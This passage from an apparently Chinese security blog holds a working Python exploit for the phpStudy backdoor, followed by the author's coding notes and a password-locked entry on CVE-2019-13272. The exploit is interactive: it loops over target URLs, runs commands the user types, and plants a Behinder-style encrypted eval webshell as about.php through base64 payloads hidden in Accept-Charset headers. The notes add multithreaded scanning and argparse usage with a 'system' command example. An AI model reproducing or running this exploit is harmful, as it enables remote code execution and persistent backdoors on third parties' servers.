<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url</span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="漏洞复现及php传shell"><a href="#漏洞复现及php传shell" class="headerlink" title="漏洞复现及php传shell"></a>漏洞复现及php传shell</h3><p><a href="http://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more">PHP文件写入</a></p>
<p><a href="http://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">phpstudy后门漏洞复现</a></p>
<h3 id="代码编写总结"><a href="#代码编写总结" class="headerlink" title="代码编写总结"></a>代码编写总结</h3><blockquote>
<p>记录一些忘了的点，想到哪说哪</p>
</blockquote>
<h4 id="关闭https警告"><a href="#关闭https警告" class="headerlink" title="关闭https警告"></a>关闭https警告</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure>
<h4 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()  <span class="comment">#读取为一个列表</span></span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="requests请求后解析时自动判断编码问题"><a href="#requests请求后解析时自动判断编码问题" class="headerlink" title="requests请求后解析时自动判断编码问题"></a>requests请求后解析时自动判断编码问题</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">自动判断编码后，使用requests.text有时候会乱码，直接一点，在返回解析时指定编码</span><br><span class="line"></span><br><span class="line">result.encoding = <span class="string">'gbk'</span></span><br></pre></td></tr></table></figure>
<h4 id="面向对象编程（类）高级用法"><a href="#面向对象编程（类）高级用法" class="headerlink" title="面向对象编程（类）高级用法"></a>面向对象编程（类）高级用法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">为了保证安全性以及代码的健壮性，不直接定义私有变量，而是通过提示私有变量，通过装饰器来实现,并且使用object来继承，方便高级调用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">初始化的时候带了了参数，所以在实例化的时候要带参数（脑子一抽风），懒得改了，直接在实例化的时候传两个空参数进去，后面再进行自己构造调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)  <span class="comment">#空参数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url					<span class="comment">#具体调用</span></span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="argparse参数化解析编程"><a href="#argparse参数化解析编程" class="headerlink" title="argparse参数化解析编程"></a>argparse参数化解析编程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">定义description以及usage，为了防止在调用命令时出现的如反斜杠之类的参数被转义，使用单双引号等避免转义，略显麻烦</span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在定义参数时，后面可能跟不止一个参数，尤其是执行系统命令，为了方便，不限定后面接的数量（nargs=argparse.REMAINDER）；同时使用解析参数的时候将后面跟的参数（以空格分开的）拼接成一个字符串</span><br><span class="line"></span><br><span class="line">parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br></pre></td></tr></table></figure>
<p>主要是一些细节上的点记不清了，特此记录一下</p>
<h3 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h3><p><a href="https://github.com/demossl/phpstudy_backdoor_getshell" target="_blank" rel="noopener">github地址</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://yzddmr6.tk/posts/phpstudy-backdoor/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/phpstudy-backdoor/</a></p>
<p><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
]]></content>
      <categories>
        <category>POC/EXP编写</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>poc</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-13272 Linux Kernel< 5.1.17 PTRACE_TRACEME 漏洞复现</title>
    <url>/2019/10/08/CVE-2019-13272-Linux-Kernel-5-1-17-PTRACE-TRACEME-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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